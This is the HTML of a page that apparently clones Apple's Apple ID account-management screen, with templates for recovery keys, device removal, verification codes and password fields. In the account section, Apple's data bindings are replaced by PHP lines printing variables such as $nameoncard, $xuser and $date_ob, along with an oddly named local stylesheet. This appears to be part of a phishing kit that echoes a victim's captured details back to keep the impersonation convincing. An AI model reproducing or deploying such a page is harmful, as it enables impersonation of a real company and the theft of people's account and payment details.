                    <div class="errorPop-body popover top in" role="tooltip">
                        <div class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{errors.question.main.message}}
                        </div>
                    </div>
                {{/if}}
            </div>
            <div class="pop-wrapper field-pop-wrapper field-wrapper field-answer">
                <input id="answer{{%index}}" data-index="{{%index}}" name="answer{{%index}}"
                       aria-label='Enter answer {{%indexOffset 1}}'
                       aria-required="true"
                       can-value="answer"
                       class="form-control form-input answer{{#errors.answer.hasErrors}} error has-errors{{/if}}"
                       type="text"
                       autocorrect="off"
                       autocapitalize="off"
                       spellcheck="false"
                       autocomplete="off"
                       placeholder="Answer"
                />
                {{#errors.answer.showError}}
                    <div class="errorPop-body popover top in" role="tooltip">
                        <div class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{errors.answer.main.message}}
                        </div>
                    </div>
                {{/if}}
            </div>
        </div>
    </div>
{{/if}}
{{/each qaModel}}
</script>
<script type="text/stache" id="jstache_1506394075">


<div id="printRecoverKeyId" class="print-rk" style="font-family: 'Lucida Grande', 'Lucida Sans Unicode', Helvetica, Arial, Verdana, sans-serif;-webkit-font-smoothing: antialiased;margin-top: 250px;border: 5px solid #dfdfdf; padding: 30px; width: 695px;height: 435px;">
    <div class="row print-header clearfix" style="position: relative; padding-bottom: 30px;">
        <div class="logo pull-left" style="float:left">
            <svg version="1.1" id="Layer_1" style="width:22px;height:22px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">
<g>
	<path fill="#333333" d="M48,27.1c1.7,0,4.6-0.7,8.5-2c3.9-1.3,7.3-2,10.2-2c4.7,0,8.9,1.3,12.6,3.8c2.1,1.5,4.1,3.4,6.2,5.9
		c-3.1,2.6-5.3,4.9-6.7,7c-2.6,3.7-3.9,7.8-3.9,12.2c0,4.9,1.4,9.3,4.1,13.2c2.7,3.9,5.8,6.4,9.3,7.4c-1.5,4.7-3.9,9.7-7.3,14.8
		C75.9,95.1,70.9,99,65.8,99c-2,0-4.8-0.6-8.3-1.9c-3.5-1.3-6.5-1.9-8.9-1.9c-2.4,0-5.2,0.7-8.4,2c-3.2,1.3-5.8,2-7.8,2
		c-6,0-11.9-5.1-17.7-15.3C8.9,73.7,6,63.8,6,54.1c0-9,2.2-16.4,6.7-22.1c4.4-5.7,10-8.5,16.8-8.5c2.9,0,6.4,0.6,10.5,1.8
		C44,26.5,46.7,27.1,48,27.1z M66.1,3.3c0,2.5-0.6,5.1-1.7,8.1c-1.2,2.9-3,5.6-5.5,8.1c-2.2,2.1-4.3,3.5-6.4,4.3
		c-1.3,0.4-3.4,0.7-6.1,1c0.1-5.8,1.6-10.9,4.6-15.1c3-4.3,7.9-7.2,14.8-8.8C65.9,1.3,66,1.8,66,2.2C66,2.6,66.1,2.9,66.1,3.3z"></path>
</g>
</svg>
        </div>
        <div class="email pull-right" style="font-size: 24px; float: right" >
            {{ obfuscatedAppleId }}
        </div>
    </div>
    <div style="clear: both;"></div>
    <div class="rk-label" style="text-align: center; padding-top:50px; font-size:18px;">
        Recovery Key:
    </div>
    <div class="rk-wrapper" style="border: 5px solid #000; text-align: center; font-size: 28px; max-width: 500px; padding: 10px;margin: auto; margin-top: 20px;">
        {{ rk }}
    </div>
    <div class="details" style="font-size:18px; padding-top:80px">
        <div class="alert" style="color: red!important; font-weight: bold;">Keep this printout stored in a safe place.</div>
        
        <div class="detail" style="padding-top:20px">If you lose your Recovery Key and forget your password, you will not be able to access to your Apple ID. To learn more, visit https://appleid.apple.com/us.</div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_147108967">


<div id="rkWrapper" class="rk-wrapper">
    <input class="rk1 {{classes}} {{#recoveryKeyLocked}}disable{{/recoveryKeyLocked}}"
           id="recoveryKey"
           name="recoveryKey"
           type="text"
           maxlength="{{maxLength}}"
           can-field="recoveryKey"
           maxlength="14"
           autocorrect="off"
           autocomplete="off"
           spellcheck="false"
           aria-invalid="false"
           {{#errorMessage}}aria-describedby="recoveryKeyErrorMessage"{{/errorMessage}}/>

    <div class="placeholder">
        <span class="rk">RK - </span>
        <span id="rkPlaceholder" class="rk-placeholder">XXXX-XXXX-XXXX</span>
    </div>
    <p id="recoveryKeyErrorMessage" class="sr-only">{{errorMessage}}</p>
</div>
</script>
<script type="text/stache" id="jstache_320438554">


{{#if show}}
    <div class="idms-modal {{wrapClass}}
         {{#type}}idms-modal-type-{{.}}{{/type}}
         {{#theme}}idms-modal-theme-{{.}}{{/theme}}
         {{#role}}idms-modal-role-{{.}}{{/role}}"
         {{#role}}role='{{.}}'{{/role}}
         {{attributes}} >
        <div class="modal-content {{mode}} {{classes}}">
            <content></content>
            {{#close}}
                <i class="icon icon_remove74_gray idms-modal-i-close" id="idms-close" tabindex="0" role="button" aria-label='{{close}}'></i>
            {{/close}}
        </div>
    </div>
{{/if}}

</script>
<script type="text/stache" id="jstache_249509471">


<div class="idms-spinner"></div>

</script>
<script type="text/stache" id="jstache_1304972525">


<div class="modal fade in default-dialog modal-with-icon device-remove-modal" id="device-remove-modal">
  <div class="modal-dialog">
    <div class="modal-content" role="dialog" aria-labelledby="device-remove-title" tabindex="-1">
        <div class="modal-body">
            <div class="row">
                <div class="col-sm-2 not-mobile">
                    
                    <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" height="63" alt="Alert icon" width="68" class="device-remove-pin" />
                </div>
                <div class="col-sm-10 exclude-padding">
                    <div class="modal-header">
                        {{#unless errorStep}}
                        <h4 class="modal-title device-remove-title" name="device-remove-title">Remove {{device.name}}?</h4>
                        {{else}}
                        <h4 class="modal-title device-remove-title" name="device-remove-title">{{device.name}} could not be removed.</h4>
                        {{/unless}}
                    </div>
                    <div class="modal-body-content exclude-padding">
                        {{#unless errorStep}}
                        <p class="body-text">
                            {{#is device.secondary true}}
                                {{#if device.applePayCards.length}}
                                After you remove this {{device.deviceClassDisplayName}} it will no longer have access to iCloud or other Apple services until you sign in again. All Apple Pay information will also be removed.
                                {{else}}
                                After you remove this {{device.deviceClassDisplayName}} it will no longer have access to iCloud or other Apple services until you sign in again.
                                {{/if}}
                            {{else}}
                                {{#is account.type "hsa2"}}
                                    {{#if device.applePayCards.length}}
                                        After you remove this {{device.deviceClassDisplayName}}, it will no longer be able to approve new devices or use iCloud and other Apple services until you sign in again. All Apple Pay information will also be removed.
                                    {{else}}
                                        After you remove this {{device.deviceClassDisplayName}}, it will no longer be able to approve new devices or use iCloud and other Apple services until you sign in again.
                                    {{/if}}
                                {{else}}
                                    {{#if device.applePayCards.length}}
                                        All Apple Pay information will be removed from the device. This {{device.deviceClassDisplayName}} will reappear if it is still signed in and connects to the Internet.
                                    {{else}}
                                        This device will reappear if it is still signed in and connects to the Internet.
                                    {{/if}}
                                {{/is}}
                            {{/is}}
                        </p>
                        {{#is account.type "hsa2"}}
                            {{#device.phoneNumber.name}}
                            <p class="caption caption-text">If this {{device.deviceClassDisplayName}} is used with a trusted phone number, contact your network provider to deactivate your SIM card to prevent it from receiving verification codes. </p>
                            {{/device.phoneNumber.name}}
                        {{/is}}
                        {{else}}
                          Your request could not be completed because of an error. Please try again later.
                        {{/unless}}
                    </div>
                </div>
            </div>
        </div>
        <div class="modal-footer clearfix">
            <div class="btn-group flow-controls pull-right">
            {{#unless errorStep}}
            <loading class="remove-device-spinner" loading={removingDevice}></loading>
            <button type="button" {{#if removingDevice}} disabled {{/if}} class="btn btn-link destructive first remove-device not-mobile" data-deviceId="{{id}}">
                Remove this {{device.deviceClassDisplayName}}
            </button>
            <button type="button" {{#if removingDevice}} disabled {{/if}} class="btn btn-link destructive first remove-device mobile-only" data-deviceId="{{id}}">
                Remove
            </button>
            <button type="button" class="btn btn-link last cancel" data-dismiss="modal"> Cancel </button>
            {{else}}
            <button type="button" class="btn btn-link last cancel" data-dismiss="modal"> OK </button>
            {{/unless}}
            </div>
        </div>
    </div>
  </div>
</div>

</script>
<script type="text/stache" id="jstache_2137875949">

<div class="modal fade in modal-with-icon default-dialog card-remove-modal" id="card-remove-all-modal">
  <div class="modal-dialog">
    <div class="modal-content" role="dialog" aria-labelledby="card-remove-all-title" tabindex="-1">
        <div class="modal-body">
            <div class="row">
                <div class="col-sm-2 not-mobile">
                    {{#is devicePixelRatio 1}}
                    <img src="https://appleid.cdn-apple.com/static/bin/cb4236788905/dist/assets/images/applepay_alert.png" height="75" alt="Card Remove" width="75" class="remove-pin" />
                    {{/is}}
                    {{#is devicePixelRatio 2}}
                    <img src="https://appleid.cdn-apple.com/static/bin/cb2021089331/dist/assets/images/applepay_alert@2x.png" height="75" alt="Card Remove" width="75" class="remove-pin" />
                    {{/is}}
                    {{#is devicePixelRatio 3}}
                    <img src="https://appleid.cdn-apple.com/static/bin/cb2391805926/dist/assets/images/applepay_alert@3x.png" height="75" alt="Card Remove" width="75" class="remove-pin" />
                    {{/is}}
                </div>
                {{#is device.applePayCards.length 1}}
                <div class="col-sm-10 exclude-padding">
                    <div class="modal-header">
                        <h4 class="modal-title remove-cards-title" id="card-remove-all-title">Are you sure you want to remove this card? </h4>
                    </div>
                    <div class="modal-body-content">
                        <p class="body-text">This card will no longer be available for payments on this device. You will be able to add this card again on your device using Wallet. It may take up to 30 seconds to remove the card. </p>
                    </div>
                </div>
                {{else}}
                <div class="col-sm-10 exclude-padding">
                    <div class="modal-header">
                        <h4 class="modal-title remove-cards-title" id="card-remove-all-title">Are you sure you want to remove all cards? </h4>
                    </div>
                    <div class="modal-body-content">
                        <p class="body-text">These cards would be no longer available for payments on this device. You will be able to add these cards again on your device using Passbook. </p>
                    </div>
                </div>
                {{/is}}
            </div>
        </div>
      <div class="modal-footer clearfix">
          <div class="btn-group flow-controls pull-right">
              <button type="button" class="btn btn-link first cancel" data-dismiss="modal"> Cancel </button>
              <button type="button" class="btn btn-link last remove-cards">Remove</button>
          </div>
      </div>
    </div>
  </div>
</div>
</script>
<script type="text/stache" id="jstache_1780019215">


{{#unless phoneNumber.northAmericaDialCode}}
    {{#unless billingAddressFeatures.hidePhoneAreaCode}}
    <div class="form-group">
        <div class="col-sm-5 col">
            <div class="form-group force-ltr">
                <basic-input classes="content-input payment-phonenumber-areaCode"
                             sr-label-text='Area Code'
                             placeholder='area code'
                             is-required='true'
                             {^@validate}="validateAreaCode"
                             validate-on-blur='false'
                             error-strings.empty='Enter the phone number on the card, including the area code.'
                             {use-popover}="usePopover"
                             {(errors)}='errors.areaCode'
                             {(value)}="phoneNumber.areaCode"></basic-input>
            </div>
        </div>
    </div>
    {{/unless}}

    <div class="form-group">
        <div class="{{#if billingAddressFeatures.hidePhoneAreaCode}}col-sm-12{{else}}col-sm-7{{/if}} col">
            <div class="form-group force-ltr">
                <basic-input classes="content-input payment-phonenumber-number"
                             sr-label-text='Phone Number'
                             placeholder='phone number'
                             is-required='true'
                             type="number"
                             {^@validate}="validateNumber"
                             validate-on-blur='false'
                             error-strings.empty='Enter your phone number.'
                             {use-popover}="usePopover"
                             {(errors)}='errors.number'
                             {(value)}="phoneNumber.number"></basic-input>
            </div>
        </div>
    </div>
{{else}}
        <div class="col-sm-12 col">
            <div class="form-group force-ltr">
                <basic-input classes="content-input payment-phonenumber-number"
                             sr-label-text='Phone Number'
                             placeholder='phone number'
                             is-required='true'
                             type="number"
                             {^@validate}="validateNumber"
                             validate-on-blur='false'
                             error-strings.empty='Enter your phone number.'
                             {use-popover}="usePopover"
                             {(errors)}='errors.number'
                             {(value)}="phoneNumber.number"></basic-input>
            </div>
        </div>
{{/unless}}
</script>
<script type="text/stache" id="jstache_19425363">


<div class="basic-input">
    {{#if srLabelText}}
    <label class="sr-only" for="idms-input-{{uid}}">{{srLabelText}}</label>
    {{/if}}
    <input id="idms-input-{{uid}}"
           {$type}="inputType"
           class="numeric-input-field generic-input-field {{classes}} form-control field {{#if errorMessage}} error {{/if}}{{#if errors.hasErrors}} has-errors{{/if}}"
           {$value}="value"
           {$maxlength}="maxLength"
           {$placeholder}="placeholder"
           autocorrect="off"
           autocomplete="off"
           {$aria-required}="isRequired"
           {$aria-invalid}="hasErrors"
           aria-describedby="idms-input-error-{{uid}}"/>

    {{#if usePopover}}
    <idms-popover {show}="hasErrorsAndFocus"
                  anchor-element="#idms-input-{{uid}}"
                  type="error">
        <div id="idms-input-error-{{uid}}">{{errorMessage}}</div>
    </idms-popover>
    {{/if}}

</div>

</script>
<script type="text/stache" id="jstache_1024874623">


<div class="aid-verify-code">
    <div class="verification-code-wrap clearfix">
        <div class="row form-group verify-set">
            <div class="col-xs-2 verify-field-wrap">
                <label for="char1" class="sr-only">
                    First Character
                </label>
                <input id="char1" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char2" class="sr-only">
                    Second Character
                </label>
                <input id="char2" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char3" class="sr-only">
                    Third Character
                </label>
                <input id="char3" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char4" class="sr-only">
                    Fourth Character
                </label>
                <input id="char4" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char5" class="sr-only">
                    Fifth Character
                </label>
                <input id="char5" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
            <div class="col-xs-2 verify-field-wrap">
                <label for="char6" class="sr-only">
                    Sixth Character
                </label>
                <input id="char6" type="tel" class="form-control char-field {{#if verificationValidator.errors.verify.hasErrors}}has-errors{{/if}}" autocomplete="false" maxlength="1" />
            </div>
        </div>
        <div class="verify-map hide">
            <label class="sr-only" for="verifyCode">Verification Code</label>
            <input type="text" class="form-control" id="verifyCode" name="verifyCode" autocomplete="false" maxlength="6" can-value="code" />
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_929793328">


<span class="errorMsg {{#if errors.verify.verification_code_invalid}}show{{/if}}">The code you entered is not valid.</span>
{{#each errorMessages.verify}}
    <span class="errorMsg show">{{{this}}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_509522083">


<div class="password-input">
  <input type="password"
         class="generic-input-field {{classes}} form-control field {{#if errorMessage}} error {{/if}}"
         can-field="{value}"
         placeholder="{{placeholder}}"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false" />
</div>
</script>
<script type="text/stache" id="jstache_2121527557">


<div class="modal fade flow-dialog default-dialog error-warning-modal" id="errorWarningModal"
     role="dialog" aria-labelledby="errorWarningModalTitle" tabindex="0" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
            	<div class="row">
            		<div class="col-sm-2 not-mobile">
            			<img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" height="64" alt="Warning" width="64" />
            		</div>
            		<div class="col-sm-10 exclude-padding content">
                		<div class="modal-header">
                    		<h4 class="modal-title" id="errorWarningModalTitle">
                        		Your request could not be completed at this time.
                    		</h4>
                		</div>
                		<div class="modal-body-content exclude-padding">
                    		<p class="body-text">Please try again later.</p>
                    		<p class="body-text error-message"><i>{{{message}}}</i></p>
                    	</div>
                	</div>
                </div>
            </div>

            <div class="modal-footer">
            	<div class="flow-controls pull-right">
                	<button type="button" class="btn btn-link last continue" data-dismiss="modal">OK</button>
            	</div>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1396581469">


<div class="masked-input">
    <input value="{{value}}"
           type="{{type}}"
           class="{{classes}}"
           placeholder="{{placeholder}}"
           autocorrect="off"
           autocapitalize="off"
           spellcheck="false" />
</div>

</script>



    
        
            
                
                
                    <link rel="stylesheet" type="text/css" media="all" href="hitlar/pak.css">

                
            
            
        
        
    


</div>

<div aria-hidden="true" id="managecontent"><manage view="{view}" reqerror="{reqerror}" config="{config}" account="{account}">


<applenav>

<aside data-strings="{ 'exit': 'Exit', 'view': '{%STOREFRONT%} Store Home', 'segments': { 'smb': 'Business Store Home', 'eduInd': 'Education Store Home', 'other': 'Store Home' } }" class="ac-gn-segmentbar" id="ac-gn-segmentbar"></aside>
<input tabindex="-1" class="ac-gn-menustate" id="ac-gn-menustate" type="checkbox">
<nav data-search-api="//www.apple.com/search-services/suggestions/" data-search-locale="en_AU" data-store-api="//www.apple.com/[storefront]/shop/bag/status" data-store-locale="au" data-store-key="" data-analytics-region="global nav" data-hires="false" aria-label="Global Navigation" role="navigation" class="js no-touch svg no-ie7 no-ie8" id="ac-globalnav" lang="en-AU">
	<div class="ac-gn-content">
		<ul class="ac-gn-header">
			<li class="ac-gn-item ac-gn-menuicon">
				<label aria-hidden="true" for="ac-gn-menustate" class="ac-gn-menuicon-label"> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span> </span> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span> </span>
				</label>
				<a tabindex="-1" id="ac-gn-menuanchor-open" class="ac-gn-menuanchor ac-gn-menuanchor-open" href="#ac-gn-menustate"> <span class="ac-gn-menuanchor-label">Open Menu</span> </a>
				<a tabindex="-1" id="ac-gn-menuanchor-close" class="ac-gn-menuanchor ac-gn-menuanchor-close" href="#"> <span class="ac-gn-menuanchor-label">Close Menu</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-apple">
				<a tabindex="-1" id="ac-gn-firstfocus-small" data-analytics-title="apple home" href="//www.apple.com/au/" class="ac-gn-link ac-gn-link-apple"> <span class="ac-gn-link-text">Apple</span> </a>
			</li>
			<li id="ac-gn-bag-small" class="ac-gn-item ac-gn-bag ac-gn-bag-small">
				<a tabindex="-1" data-string-badge="Shopping Bag with Items" aria-label="Shopping Bag" data-analytics-click="bag" data-analytics-title="bag" href="//www.apple.com/au/shop/goto/bag" class="ac-gn-link ac-gn-link-bag"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
		</ul>
		<ul class="ac-gn-list">
			<li class="ac-gn-item ac-gn-apple">
				<a tabindex="-1" id="ac-gn-firstfocus" data-analytics-title="apple home" href="//www.apple.com/au/" class="ac-gn-link ac-gn-link-apple"> <span class="ac-gn-link-text">Apple</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
				<a tabindex="-1" data-analytics-title="mac" href="//www.apple.com/au/mac/" class="ac-gn-link ac-gn-link-mac"> <span class="ac-gn-link-text">Mac</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
				<a tabindex="-1" data-analytics-title="ipad" href="//www.apple.com/au/ipad/" class="ac-gn-link ac-gn-link-ipad"> <span class="ac-gn-link-text">iPad</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
				<a tabindex="-1" data-analytics-title="iphone" href="//www.apple.com/au/iphone/" class="ac-gn-link ac-gn-link-iphone"> <span class="ac-gn-link-text">iPhone</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
				<a tabindex="-1" data-analytics-title="watch" href="//www.apple.com/au/watch/" class="ac-gn-link ac-gn-link-watch"> <span class="ac-gn-link-text">Watch</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
				<a tabindex="-1" data-analytics-title="tv" href="//www.apple.com/au/tv/" class="ac-gn-link ac-gn-link-tv"> <span class="ac-gn-link-text">TV</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-music">
				<a tabindex="-1" data-analytics-title="music" href="//www.apple.com/au/music/" class="ac-gn-link ac-gn-link-music"> <span class="ac-gn-link-text">Music</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-support">
				<a tabindex="-1" data-analytics-title="support" href="//www.apple.com/au/support/" class="ac-gn-link ac-gn-link-support"> <span class="ac-gn-link-text">Support</span> </a>
			</li>
			<li role="search" class="ac-gn-item ac-gn-item-menu ac-gn-search">
				<a tabindex="-1" aria-haspopup="true" role="button" aria-label="Search apple.com/au" data-analytics-click="search" data-analytics-title="search" href="//www.apple.com/au/search" class="ac-gn-link ac-gn-link-search"> <span aria-hidden="true" class="ac-gn-search-placeholder">Search apple.com/au</span> </a>
			</li>
			<li id="ac-gn-bag" class="ac-gn-item ac-gn-bag">
				<a tabindex="-1" data-string-badge="Shopping Bag with Items" aria-label="Shopping Bag" data-analytics-click="bag" data-analytics-title="bag" href="//www.apple.com/au/shop/goto/bag" class="ac-gn-link ac-gn-link-bag"> <span class="ac-gn-link-text">Shopping Bag</span> <span aria-hidden="true" class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
		</ul>
		<aside data-analytics-region="search" role="search" class="ac-gn-searchview" id="ac-gn-searchview">
			<div class="ac-gn-searchview-content">
				<form method="get" action="//www.apple.com/au/search" class="ac-gn-searchform" id="ac-gn-searchform">
					<div class="ac-gn-searchform-wrapper">
						<input tabindex="-1" spellcheck="false" autocomplete="off" autocapitalize="off" autocorrect="off" data-placeholder-long="Search for Products, Stores and Help" placeholder="Search apple.com/au" class="ac-gn-searchform-input" id="ac-gn-searchform-input" type="text">
						<input tabindex="-1" value="globalnav" name="src" id="ac-gn-searchform-src" type="hidden">
						<button tabindex="-1" aria-label="Submit" disabled="" type="submit" class="ac-gn-searchform-submit" id="ac-gn-searchform-submit"></button>
						<button tabindex="-1" aria-label="Clear Search" disabled="" type="reset" class="ac-gn-searchform-reset" id="ac-gn-searchform-reset"></button>
					</div>
				</form>
				<aside data-string-noresults="Hit enter to search." data-string-suggestions="Suggested Searches" data-string-quicklinks="Quick Links" class="ac-gn-searchresults" id="ac-gn-searchresults"></aside>
			</div>
			<button tabindex="-1" aria-label="Close Search" class="ac-gn-searchview-close" id="ac-gn-searchview-close"> <span class="ac-gn-searchview-close-wrapper">
						<span class="ac-gn-searchview-close-left"></span> <span class="ac-gn-searchview-close-right"></span> </span>
			</button>
		</aside>
		<aside data-analytics-region="bag" class="ac-gn-bagview">
			<div class="ac-gn-bagview-scrim"> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span> </div>
			<div id="ac-gn-bagview-content" class="ac-gn-bagview-content"> </div>
		</aside>
	</div>
</nav>
<div class="ac-gn-curtain" id="ac-gn-curtain"></div>
<div class="ac-nav-placeholder" id="ac-gn-placeholder"></div>


<script src="https://www.apple.com/ac/globalnav/2.0/en_AU/scripts/ac-globalnav.built.js" type="text/javascript"></script></applenav>
<div class="manage">
    <header></header>
    <photo config="{config}" account="{account}">


<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div></p>
    <div class="container"></p>
        <div class="splash-section">
            <div class=" person-wrapper">
                <div class="">
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile-only appleid-user"></p></p>
                                        <span class="first_name" id="first_name"><?php print "$nameoncard"; ?></span>                                     
                                    <small class="appleid-username" id="username">Your Apple ID is <span class="acc-name force-ltr"><?php print "$nameoncard"; ?></span> </small>
                                </h1>
                                <h1 class="not-mobile appleid-user">
                                        <span class="first_name" id="first_name"><?php print "$nameoncard"; ?></span>                                    
                                    <small class="appleid-username" id="username">Your Apple ID is <span class="force-ltr"><strong><?php print "$xuser"; ?></strong></span> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button tabindex="-1" class="btn btn-link">Sign Out </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

</photo>
        <div class="container flow-sections">
            <account {config}="config" {(account)}="account" editable-birthday="{editableBirthday}">


<section class="flow-section mobile-only non-edit" id="accountNonEdit">
    <div class="account-wrapper">
        <div class="row">
            <div class="col-md-3 section-name">
                <div class="section-action">
                    <button tabindex="-1" aria-controls="account-content" class="btn btn-link section-title">
                        Account
                    </button>
                </div>
            </div>
        </div>
    </div>
</section>
<section class="flow-section mobile-section-edit  non-edit " id="account">
    <div class="account-wrapper">
        <div class="row">
            <div id="heading-account" class="col-md-3 section-name">
                <h2 class="not-mobile section-title break-section-title">
                    Account
                </h2>
                    <div class="section-action">
                        <button tabindex="-1" aria-controls="account-content" class="btn btn-link section-title">
                            Account
                        </button>
                    </div>
            </div>
            <div class="col-md-9 subsection" aria-labelledby="heading-account" id="account-content">
                <accordion delay="0.4" edit="{editMode}">


<div class="accordion-fade ">
    <div class="accordion-fade acdn-edit">
    </div>
    <div class="accordion-fade acdn-nonedit">
            
                        <div class="account-details clearfix">
                            <div class="row">
                                <div class="col-sm-5">
                                    <div class="flow-subsection">
                                        <h3 class="section-subtitle no-outline"> APPLE ID</h3>
                                        <div class="pin-tip-wrapper apple-id clearfix">
                                            <string-ellipsis content-value="{account.name}">


<div class="pop-wrapper pin-wrapper">
    <div class="pin-tip force-ltr">        <?php print "$xuser"; ?>
    </div>
</div>
</string-ellipsis>
                                        </div>
                                    </div>
                                        
                                    
                                    <div class="flow-subsection">
                                        <h3 class="section-subtitle">BIRTHDAY</h3>
                                        <div class="birthday">
<?php print "$date_ob"; ?>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-5">
                                    <h3 class="section-subtitle"> Full Name</h3>
                                        <div class="account-detail clearfix">                                           <?php print "$nameoncard"; ?> 
                                        </div>

                                        <div class="pin-tip-wrapper account-detail clearfix">
                                            <string-ellipsis content-value="{account.name}">


<div class="pop-wrapper pin-wrapper">
    <div class="pin-tip force-ltr">        <?php print "$xuser"; ?>
    </div>
</div>
</string-ellipsis>
                                        </div>

                                        
                                    
                                        
                                            <div class="pin-tip-wrapper account-detail clearfix">
                                                <string-ellipsis content-value="">


<div class="pop-wrapper pin-wrapper">
    <div class="pin-tip force-ltr">        
    </div>
</div>
</string-ellipsis>
                                            </div>
                                    
                                        
                                                
                                                    <div class="pin-tip-wrapper account-detail clearfix">
                                                            <string-ellipsis content-value="{address}">


<div class="pop-wrapper pin-wrapper">
    <div class="pin-tip force-ltr">        
    </div>
</div>
</string-ellipsis>
                                                    </div>
                                            
                                    
                                        
                                                
                                            
                                    
                                </div>
                                <div class="col-sm-2 section-edit">
                                    <button tabindex="-1" class="btn btn-link btn-edit acdn-btn-edit acdn-btn-edit"> Edit</button>
                                </div>
                            </div>
                        </div>                    
                
    </div>
</div>
</accordion>
            </div>
        </div>
    </div>
</section>

</account>
            <msecurity config="{config}" account="{account}" editable-birthday="{editableBirthday}">


<section class="flow-section mobile-only non-edit" id="securityNonEdit">
    <div class="row">
        <div id="heading-security" class="col-md-3 section-name">
            <div class="section-action">
                <button tabindex="-1" aria-controls="security-content" class="btn btn-link section-title">
                    Security
                </button>
            </div>
        </div>
    </div>
</section>
<section class="flow-section mobile-section-edit  non-edit " id="security">
    <div class="row">
        <div id="heading-security" class="col-md-3 section-name">
            <h2 class="not-mobile section-title break-section-title">
                Security
            </h2>
            <div class="section-action">
                <button tabindex="-1" aria-controls="security-content" class="btn btn-link section-title">
                    Security
                </button>
            </div>
        </div>
        <div aria-labelledby="heading-security" id="security-content" class="col-md-9 subsection">
            <accordion style="display: block; height: 176px;" delay="0.4" edit="{editMode}">


<div class="accordion-fade ">
    <div style="opacity: 0.7; overflow: hidden;" class="accordion-fade acdn-edit">
    </div>
    <div class="accordion-fade acdn-nonedit">
            
                    <div class="security-details">
                        <div class="row">
                            <div class="col-sm-5">
                                <div class="flow-subsection">
                                    <div class="detail">
                                        <changepassword error="{error}" opened="{pwEnabled}" nonedit="true" config="{config}" account="{account}">


<h3 id="passwordLabel" class="section-subtitle">PASSWORD</h3>
<div aria-describedby="passwordDescription" aria-labelledby="passwordLabel" class="detail">
    <div class="pop-wrapper">
        <button tabindex="-1" class="btn btn-link change-password"> Change Password... </button>
        
    </div>
</div>

</changepassword>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-5">
                                
                                    <div class="flow-subsection">
                                        <div class="detail">
                                            <changequestions opened="{questionsEnabled}" config="{config}" account="{account}">


<h3 id="securityQuestionLabel" class="section-subtitle">SECURITY QUESTIONS</h3>
<div class="detail">
    <div class="pop-wrapper">
        <button tabindex="-1" class="btn btn-link change-questions">Change Questions...</button>
        
    </div>
</div>

</changequestions>
                                        </div>
                                    </div>
                                
                                
                            </div>
                            <div class="col-sm-2 section-edit security-edit">
                                <button tabindex="-1" class="btn btn-link btn-edit acdn-btn-edit btn-security">Edit</button>
                                <loading loading="{loadingEdit}">


<div style="display: none;" class="loading">
  <i class="icon  icon_process rotate spinner"></i>
</div>
</loading>
                            </div>
                        </div>
                        <div class="row security-row">
                                <div class="col-sm-5">
                                    <div class="flow-subsection">
                                        <rescue-email-view config="{config}" account="{account}">


<section>
    <header>
        <h3 tabindex="-1" class="section-subtitle no-outline">
            RESCUE EMAIL
        </h3>
    </header>
    <div class="detail rescue-email">
            <div class="pin-tip-wrapper recovery-email clearfix">
                <string-ellipsis content-value="{account.security.rescueEmail}">


<div class="pop-wrapper pin-wrapper">
